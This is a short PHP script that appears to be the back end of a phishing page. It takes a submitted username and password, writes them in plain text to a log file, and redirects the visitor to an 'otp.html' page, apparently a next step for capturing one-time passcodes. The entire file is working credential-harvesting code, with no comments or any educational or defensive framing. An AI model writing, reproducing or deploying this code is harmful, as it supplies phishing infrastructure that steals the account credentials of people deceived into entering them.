<?php

if ($_SERVER["REQUEST_METHOD"] == "POST"){
	$username = $_POST["username"];
	$password = $_POST["password"];
	$file = fopen("log.txt","w");
	$data = "Username: ".$username."\nPassword: ".$password;
	fwrite($file, $data);
	fclose($file);
	header("Location: otp.html");
}
?>
